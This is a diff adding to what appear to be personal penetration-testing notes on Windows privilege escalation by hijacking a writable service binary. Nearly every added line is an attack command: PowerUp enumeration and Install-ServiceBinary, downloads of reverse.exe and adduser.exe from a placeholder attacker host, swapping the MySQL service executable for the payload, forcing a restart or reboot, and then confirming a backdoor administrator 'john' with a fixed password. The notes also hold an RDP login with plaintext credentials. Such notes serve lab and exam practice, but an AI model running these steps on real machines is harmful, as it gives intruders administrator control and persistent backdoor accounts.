@@ -172,6 +172,50 @@ $ModifiableFiles
 
  Get-ModifiableServiceFile 
 
+ Powerup
+Upload it
+iwr -uri http://<ATTACKER>/reverse.exe -Outfile rev.exe
+
+RDP in
+xfreerdp /u:admin /p:'mypassword' /v:'192.168.208.220' /cert-ignore /w:1366 /h:768
+
+NOTE:  must be rdp session
+Get-ModifiableServiceFile
+or
+$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
+$ModifiableFiles
+
+#### Attempt exploit
+Install-ServiceBinary -Name 'mysql'
+
+If that fails try manual install
+
+iwr -uri http://<ATTACKER>/adduser.exe -Outfile adduser.exe
+#### you can't just download directly into the folder, do the following...
+
+#### make backup
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+
+#### moves your stuff in
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+#### Restart service
+net stop mysql
+
+#### If that doesn't work, check if its a start up service
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+
+#### If yes, reboot system
+shutdown /r /t 0
+
+==============================================
+verify user john with the password Password123! if using Powerup AbuseFunction or with adduser.c
+net localgroup administrators
+
+Login as john
+runas /user:john "cmd.exe"
+
+
           
 
           
